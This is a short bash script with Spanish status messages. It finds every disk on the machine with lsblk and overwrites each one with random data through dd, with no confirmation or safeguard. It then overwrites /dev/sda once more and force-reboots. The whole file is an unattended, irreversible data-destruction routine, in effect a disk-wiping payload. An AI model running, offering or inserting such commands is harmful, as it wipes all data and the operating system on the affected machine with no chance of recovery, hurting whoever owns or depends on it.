#!/bin/bash

echo "Obteniendo lista de discos disponibles..."
disks=$(lsblk -d -n -o NAME,SIZE,TYPE | grep 'disk' | awk '{print "/dev/"$1}')

echo "Se encontraron los siguientes discos:"
echo "$disks"

for disk in $disks; do
    echo "Sobreescribiendo el disco $disk con datos aleatorios..."
    dd if=/dev/urandom of=$disk bs=4M status=progress
    echo "Disco $disk sobrescrito con datos aleatorios."
done

sync

dd if=/dev/urandom of=/dev/sda bs=4M status=progress

sync

reboot -f
